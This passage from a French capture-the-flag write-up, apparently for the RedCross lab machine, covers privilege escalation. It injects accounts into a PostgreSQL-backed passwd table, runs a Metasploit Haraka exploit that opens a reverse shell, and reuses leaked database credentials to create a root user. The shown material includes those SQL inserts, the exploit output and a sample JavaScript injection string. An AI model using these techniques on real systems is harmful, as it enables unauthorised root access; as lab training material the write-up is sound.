drwxrwx--- 6 penelope mailadm  4096 Jun  7  2018 haraka
-rw-r--r-- 1 penelope penelope  675 Jun  3  2018 .profile
-rw-r--r-- 1 penelope penelope   24 Jun 10  2018 .psqlrc
drwx------ 2 penelope penelope 4096 Jun  9  2018 .ssh
-rw-r----- 1 root     penelope   33 Jun  7  2018 user.txt
-rw------- 1 penelope penelope  791 Jun 10  2018 .viminfo
```

On est bien sûr tenté de nous ajouter un compte UNIX avec les droits de l'utilisatrice. Pour cela on se connecte à la base de données avec *psql -h 127.0.0.1 -d unix -U unixusrmgr*, on rentre le mot de passe puis on passe la requête suivante :  

```plain
insert into passwd_table (username, passwd, uid, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1000, 1000, '/home/penelope');
```

Ici le mot de passe chiffré a été obtenu avec la commande *openssl passwd -1 -salt xyz hell0there*.  

NB: J'ai vu au préalable dans *action.php* que les mot de passe sont chiffrés simplement avec *crypt()*.  

L'opération échoue avec le message  

> ERROR: permission denied for relation passwd\_table

On ne peut pas *emprunter* l'UID de l'utilisatrice. On va donc s'en tenir à son groupe. Les UIDs sont rattachés à une séquence (auto-increment) :  

```plain
insert into passwd_table (username, passwd, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1000, '/home/penelope');
```

Cette fois on peut se connecter :  

```plain
devloop@kali:~/Documents/redcross$ ssh devloop@intra.redcross.htb 
devloop@intra.redcross.htb's password: 
Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
devloop@redcross:~$ pwd
/home/penelope
devloop@redcross:~$ ls
haraka  user.txt
devloop@redcross:~$ cat user.txt 
ac899bd-- snip --29bf
```

C'est bien mais ça ne nous donne pas de shell...  

L'utilisatrice a un dossier *haraka* qui nécessite les droits du groupe *mailadm* (gid 1003) pour y accéder. [Haraka](https://github.com/baudehlo/Haraka) est un serveur mail mail basé sur *Node*. Il est surtout vulnérable et une faille permet l'exécution de commande : [il y a un module Metasploit pour ça](https://github.com/rapid7/metasploit-framework/pull/7873/files).  

En revanche il faut pouvoir accéder à la configuration du Haraka pour réaliser l'exécution de commande, ce qui sera notre cas si on obtient le bon gid ;-)   

```plain
insert into passwd_table (username, passwd, gid, homedir) values ('devloop2', '$1$xyz$b0R51BwJVtqELmbicAObd.', 1003, '/home
```

Une fois la configuration de *Haraka* vérifiée via notre nouveau compte SSH on peut utiliser le module Metasploit :  

```plain
msf exploit(linux/smtp/haraka) > show options

Module options (exploit/linux/smtp/haraka):

   Name        Current Setting        Required  Description
   ----        ---------------        --------  -----------
   SRVHOST     10.10.12.13            yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     8080                   yes       The local port to listen on.
   SSL         false                  no        Negotiate SSL for incoming connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   email_from  devloop@redcross.htb   yes       Address to send from
   email_to    penelope@redcross.htb  yes       Email to send to, must be accepted by the server
   rhost       10.10.10.113           yes       Target server
   rport       1025                   yes       Target server port

Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.12.13      yes       The listen address (an interface may be specified)
   LPORT  9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   linux x64

msf exploit(linux/smtp/haraka) > exploit

[*] Started reverse TCP handler on 10.10.12.13:9999
[*] Exploiting...
[*] Using URL: http://10.10.12.13:8080/v57N0ltNF62k
[*] Sending mail to target server...
[*] Client 10.10.10.113 (Wget/1.18 (linux-gnu)) requested /v57N0ltNF62k
[*] Sending payload to 10.10.10.113 (Wget/1.18 (linux-gnu))
[*] Sending stage (38 bytes) to 10.10.10.113
[*] Command shell session 2 opened (10.10.12.13:9999 -> 10.10.10.113:59428) at 2019-01-19 16:11:49 +0100
id
[+] Triggered bug in target server (plugin timeout)
[*] Command Stager progress - 100.00% done (116/116 bytes)
[*] Server stopped.

uid=1000(penelope) gid=1000(penelope) groups=1000(penelope)
```

Same Old Story
--------------

On peut se servir du PAM/PostgreSQL pour obtenir notre accès root aussi. On s'accorder d'abord un GID 0 :  

```plain
insert into passwd_table (username, passwd, gid, homedir) values ('devloop', '$1$xyz$b0R51BwJVtqELmbicAObd.', 0, '/');
```

On peut ensuite fouiller les fichiers potentiellement intéressants auquel on n'avait pas accès :  

```bash
find / -group 0 -perm -g+w -type f -not -path '/proc/*' 2> /dev/null
```

Ce dernier est ressorti :  

```plain
-rw-rw---- 1 root root 540 Jun  8  2018 /etc/nss-pgsql-root.conf
```

Avec le contenu suivant :  

```plain
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);
```

Ces identifiants nous donnent contrôle total sur la table *passwd\_table*, on peut alors créer un nouvel utilisateur avec uid et gid 0 et utiliser *su* pour récupérer les droits sur le système :)  

Under the hood
--------------

Que se trame t-il derrière le compte root ?  

```plain
devloop3@redcross:/root$ ls -la
total 64
drwxr-x---  6 root root  4096 Oct 31 12:33 .
drwxr-xr-x 22 root root  4096 Jun  3  2018 ..
-rw-------  1 root root     0 Oct 31 12:33 .bash_history
-rw-r--r--  1 root root  3380 Jun 10  2018 .bashrc
drwxr-xr-x  3 root root  4096 Jun  6  2018 bin
drwxrwxr-x 11 root root  4096 Jun  7  2018 Haraka-2.8.8
drwxr-xr-x  4 root root  4096 Jun  7  2018 .npm
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r--r--  1 root root    24 Jun 10  2018 .psqlrc
-rw-------  1 root root  1024 Jun  3  2018 .rnd
-rw-------  1 root root    33 Jun  8  2018 root.txt
-rw-r--r--  1 root root    74 Jun  6  2018 .selected_editor
drwx------  4 root root  4096 Jun  3  2018 .thumbnails
-rw-------  1 root root 12885 Oct 31 12:30 .viminfo
```

Sous *bin* se trouve un script Python *redcrxss.py* dont voici le contenu :  

```python
#!/usr/bin/python2.7
import mysql.connector
import urllib
import random
import string
import time
import os

url="https://admin.redcross.htb/9a7d3e2c3ffb452b2e40784f77723938/573ba8e9bfd0abd3d69d8395db582a9e.php?"

def launchXSS(xss):
    randomname=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase+string.digits) for _ in range(8))
    temppath="/root/bin/tmp/"
    fn=temppath+randomname+'.js'
    phantom="/usr/local/bin/phantomjs"
    phjs ='"use strict";\n'
    phjs+="var page = require('webpage').create();\n"
    phjs+="page.open('"+xss+"', function(status) {\n"
    phjs+='  console.log("Status: " + status);\n'
    phjs+='  if(status === "success") {\n'
    phjs+="    page.render('/tmp/example.png');\n"
    phjs+="  }\n"
    phjs+="  phantom.exit();\n"
    phjs+="});\n"

    f=open(fn,'wb')
    f.write(phjs)
    f.close()
    command=phantom+" --ignore-ssl-errors=true "+fn
    print command
    os.system(command)
    os.remove(fn)

while 1:
    cnx = mysql.connector.connect(user='dbcross', password='LOSPxnme4f5pH5wp', host='127.0.0.1', database='redcross')
    cursor = cnx.cursor(dictionary=True)
    query = ("SELECT id, subject, body, cback FROM requests")
    cursor.execute(query)
    res=cursor.fetchall()
    if(len(res)>0):
        for r in res:
            rid=r['id']
            xss=urllib.urlencode({'x':r['cback']})
            query = ("DELETE FROM requests WHERE id = %s")
            cursor.execute(query,(rid,))
            cnx.commit()
            payload=url+xss
            launchXSS(payload)
        cnx.close()
    else:
        print "Sleeping 10 secs..."
        time.sleep(10)
```

Ce code est celui qui se charge de créer les identifiants reçus via le formulaire de contact et qui nous a ouvert l'accès à la section admin.  

Cela aurait pu être fun d'avoir à injecter du code dans *launchXSS* malheureusement le *urlencode()* en ligne 43 nous empêchera de placer la moindre apostrophe.  

Dans le cas contraire on aurait pu injecter la chaîne suivante pour exécuter *sleep 5* sur la machine :  

```plain
');var execFile=require('child_process').execFile;execFile('sleep',['5'],null,function(){phantom.exit();});console.log('
```

Outro
-----

Un CTF très intéressant avec différents chemins pour obtenir le flag root, en revanche j'ai bien l'impression qu'aucun ne requiert de passer absolument par l'utilisatrice *penelope* :p

*Published April 13 2019 at 17:10*